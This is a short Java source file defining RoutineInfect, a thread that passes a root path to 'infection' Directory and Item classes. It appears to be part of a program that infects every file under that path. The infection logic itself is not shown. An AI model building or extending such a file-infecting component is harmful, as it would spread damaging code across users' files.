package com.xpf.me.sms.routine;

import com.xpf.me.sms.routine.infection.Directory;
import com.xpf.me.sms.routine.infection.Item;

import java.io.File;

/**
 * Created by xgo on 10/30/15.
 */

public class RoutineInfect extends Thread {

    // root path infection
    private String root;

    public RoutineInfect(String root) {
        this.root = root;
    }

    @Override
    public void run() {
        FactoryInfect(root);
    }

    public static void FactoryInfect(String path) {
        File file = new File(path);
        if (file.isDirectory())
            new Directory(file, true);
        else
            new Item(file, true);
    }
}